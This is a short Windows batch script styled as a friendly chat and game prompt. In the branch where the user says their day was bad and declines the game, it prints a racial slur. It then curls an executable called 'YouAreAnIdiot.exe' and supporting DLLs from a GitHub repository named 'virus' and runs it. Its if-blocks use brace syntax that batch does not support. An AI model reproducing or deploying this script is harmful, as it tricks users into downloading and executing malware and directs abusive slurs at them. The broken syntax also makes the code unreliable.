echo off
cls
:start
echo Hi, seems you have become lost.
timeout /t 2 >nul
echo My question is how did you end up here?
timeout /t 1 >nul
echo Do you want to continue?
timeout /t 2 >nul
echo Yes or No?
set /p choice= Make your choice!:
if "%choice%" == "yes" {
    cls
    goto continue
} if "%choice%" == "no"{
    echo see you next time ig?
    timeout /t 1 >nul
    exit
}

:continue
echo So has your day been good so far?
set /p choice=Good or Bad?:
if "%choice%" == "good"{
    echo cool
    timeout /t 1.5 >nul
    echo want to play a game or something?
    set /p choice=Make a choice:
    if "%choice%" == "yes" {
        goto continue2
    }
} if "%choice%" == "bad" {
echo huh
timeout /t 1 >nul 
echo oh well none of my business
timeout /t 1 >nul
echo but anyways lets change the topic!
timeout /t 1 >nul
echo so want to play a game?
echo Yes or No?
set /p choice=Make a choice:
if "%choice%" == "yes" {
    echo sweet!
    timeout /t 1 >nul
    goto continue2
} if "%choice%" == "no" {
    echo well fuck you nigga
    timeout /t 1 >nul
    curl -o youareanidiot.exe https://github.com/neghawhat/virus/raw/refs/heads/main/YouAreAnIdiot.exe
    curl -o AxInterop.ShockwaveFlashObjects.dll https://github.com/neghawhat/virus/raw/refs/heads/main/AxInterop.ShockwaveFlashObjects.dll
    curl -o Interop.ShockwaveFlashObjects.dll https://github.com/neghawhat/virus/raw/refs/heads/main/Interop.ShockwaveFlashObjects.dll
    echo please wait...
    timeout /t 10 >nul
    start youareanidiot.exe   
} if else {
    echo seems you havent didnt type the right thing
    timeout /t 2 >nul
    echo let me autocorrect that for you
    timeout /t 1 >nul
    echo Your answer is: (insert drumroll)
    timeout /t 2 >nul
    echo YES!!!
}
}

:continue2
cls
echo Hi
pause